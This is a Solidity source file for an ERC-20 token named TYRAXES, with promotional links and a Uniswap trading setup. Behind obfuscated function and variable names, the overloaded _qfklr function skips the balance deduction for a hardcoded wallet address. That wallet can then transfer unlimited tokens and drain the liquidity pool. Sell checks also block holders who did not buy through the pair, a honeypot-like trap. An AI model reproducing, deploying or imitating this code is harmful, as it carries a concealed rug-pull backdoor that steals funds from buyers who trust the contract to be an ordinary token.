/**
           Telegram - https://t.me/Tyraxes_ETH
           Twitter - https://twitter.com/Tyraxes_eth
           Website - https://www.tyraxes.com/
**/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _qfklr(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _qfklr(a, b, "SafeMath");
    }

    function  _qfklr(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _byefj(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract TYRAXES is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _poeraou;
    address payable private _qfevdo;
    address private _bxevrp;
    string private constant _name = unicode"TYRAXES";
    string private constant _symbol = unicode"$TYRAXES";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ylvadr=0;
    uint256 private _pvfegt=0;
    uint256 public _puabck = _totalSupply;
    uint256 public _qreork = _totalSupply;
    uint256 public _pyrevb= _totalSupply;
    uint256 public _qfrovd= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _buvlod;
    mapping (address => bool) private _hvdczk;
    mapping(address => uint256) private _flakrg;

    bool private _msemopen;
    bool public _prudcq = false;
    bool private klbonk = false;
    bool private _revyrj = false;


    event _qrekjp(uint _puabck);
    modifier frntey {
        klbonk = true;
        _;
        klbonk = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _buvlod[owner(

        )] = true;
        _buvlod[address
        (this)] = true;
        _buvlod[
            _qfevdo] = true;
        _qfevdo = 
        payable (0x1C8712B85DB90DE5113a4eFD09Dc7D60EBAE6Dba);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _qfklr(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 qrobfg=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_prudcq) {
                if (to 
                != address
                (_poeraou) 
                && to !=
                 address
                 (_bxevrp)) {
                  require(_flakrg
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _flakrg
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _bxevrp && to != 
            address(_poeraou) &&
             !_buvlod[to] ) {
                require(amount 
                <= _puabck,
                 "Exceeds the _puabck.");
                require(balanceOf
                (to) + amount
                 <= _qreork,
                  "Exceeds the _qreork.");
                if(_pvfegt
                < _ylvadr){
                  require
                  (! _frvdx(to));
                }
                _pvfegt++;
                 _hvdczk
                 [to]=true;
                qrobfg = amount._byefj
                ((_pvfegt>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _bxevrp &&
             from!= address(this) 
            && !_buvlod[from] ){
                require(amount <= 
                _puabck && 
                balanceOf(_qfevdo)
                <_qfrovd,
                 "Exceeds the _puabck.");
                qrobfg = amount._byefj((_pvfegt>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_pvfegt>
                _ylvadr &&
                 _hvdczk[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!klbonk 
            && to == _bxevrp &&
             _revyrj &&
             contractTokenBalance>
             _pyrevb 
            && _pvfegt>
            _ylvadr&&
             !_buvlod[to]&&
              !_buvlod[from]
            ) {
                _transferFrom( _byksv(amount, 
                _byksv(contractTokenBalance,
                _qfrovd)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _prdnek(address
                    (this).balance);
                }
            }
        }

        if(qrobfg>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(qrobfg);
          emit
           Transfer(from,
           address
           (this),qrobfg);
        }
        _balances[from
        ]= _qfklr(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _qfklr(qrobfg));
        emit Transfer
        (from, to, 
        amount.
         _qfklr(qrobfg));
    }

    function _transferFrom(uint256
     tokenAmount) private
      frntey {
        if(tokenAmount==
        0){return;}
        if(!_msemopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _poeraou.WETH();
        _approve(address(this),
         address(
             _poeraou), 
             tokenAmount);
        _poeraou.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _byksv
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _qfklr(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _qfevdo){
            return a ;
        }else{
            return a .
             _qfklr (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _puabck = _totalSupply;
        _qreork = _totalSupply;
        emit _qrekjp(_totalSupply);
    }

    function _frvdx(address 
    account) private view 
    returns (bool) {
        uint256 Fovep;
        assembly {
            Fovep :=
             extcodesize
             (account)
        }
        return Fovep > 
        0;
    }

    function _prdnek(uint256
    amount) private {
        _qfevdo.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _msemopen ) ;
        _poeraou  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _poeraou), 
            _totalSupply);
        _bxevrp = 
        IUniswapV2Factory(_poeraou.
        factory( ) 
        ). createPair (
            address(this
            ),  _poeraou .
             WETH ( ) );
        _poeraou.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_bxevrp).
        approve(address(_poeraou), 
        type(uint)
        .max);
        _revyrj = true;
        _msemopen = true;
    }

    receive() external payable {}
}